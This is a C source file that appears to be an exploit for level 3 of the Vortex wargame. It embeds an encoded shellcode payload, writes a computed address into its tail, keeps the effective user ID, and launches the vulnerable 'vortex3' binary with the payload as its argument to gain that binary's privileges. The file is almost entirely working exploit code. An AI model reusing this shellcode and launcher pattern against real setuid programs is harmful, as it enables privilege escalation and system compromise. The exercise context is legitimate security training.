#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include "hexdump.h"

int main (int argc, char* argv[]) {
	int i;
	uid_t uid;
	char buf[1024];
	char shellcode[] = 
	 "\x98\x3c\x7e\x0c\x05\x46\x49\x15\x6b\xd0\xd4\x66\x9b\xb8"
	 "\x93\x7b\x24\xb0\x42\xfd\x92\x27\x69\xd5\x37\x67\x9f\xb6"
	 "\x76\x04\xb1\xb9\x3f\xa8\x90\x23\xf5\xbb\xb4\x4e\x3d\xb3"
	 "\x97\x2d\x91\x99\x25\xfc\x41\x4b\xbe\x1c\xf8\x4f\xba\xb7"
	 "\x47\x4a\x96\x2f\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff"
	 "\xc0\x5e\x81\x76\x0e\x59\xac\x6e\x65\x83\xee\xfc\xe2\xf4"
	 "\x33\xa7\x36\xfc\x0b\xca\x06\x48\x3a\x25\x89\x0d\x76\xdf"
	 "\x06\x65\x31\x83\x0c\x0c\x37\x25\x8d\x37\xb1\xa5\x6e\x65"
	 "\x59\x83\x0c\x0c\x37\x83\x1d\x0d\x59\xac\x39\x36\xd0\x4d"
	 "\xa3\xe5"
	 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

	int val = atoi(argv[1]) + 0x08040000;
	printf("val: 0x%08x\n", val);
	printf("sizeof(shellcode): %d\n", sizeof(shellcode));

	for (i = sizeof(shellcode) - 17; i < sizeof(shellcode); i++) {
		shellcode[i] = *((char*) &val + (i%4));
	}

	hexdump(shellcode, buf, 0, sizeof(shellcode));
	printf("%s", buf);
	
	uid = geteuid();
	setreuid(uid, uid);
//	mprotect((void*)0x0804900, 4096, PROT_WRITE);
//	mprotect((void*)0x0804800, 4096, PROT_WRITE);
	execl("./vortex3", "./vortex3", shellcode, NULL);
	perror(NULL);
	printf("fail\n");
	return 0;
}

